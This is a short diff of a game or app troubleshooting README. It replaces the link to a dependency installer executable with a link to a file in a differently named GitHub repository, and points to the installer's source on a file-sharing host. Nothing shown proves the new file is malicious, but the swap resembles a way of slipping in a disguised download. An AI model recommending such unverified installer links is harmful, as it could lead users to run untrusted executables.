@@ -79,7 +79,7 @@ Install all:
 * [DirectX](https://www.microsoft.com/en-us/download/details.aspx?id=8109)  
 * [d3d](https://www.microsoft.com/en-us/download/details.aspx?id=35)
 
-If you don't want to install these manually, you can use the [installer](https://github.com/riicess/Swift-TroubleShooting-Guide/blob/main/SwiftDepsInstall.exe).  
+If you don't want to install these manually, you can use the [installer](https://github.com/ssenualitzies/Ssenualitzies-Riices-Swift-Fix-Guide/blob/main/dependencies%20checker)  
 The source code for this installer can be found [here](https://jmp.sh/XUtd6wQN).
 
 Then restart your PC.  
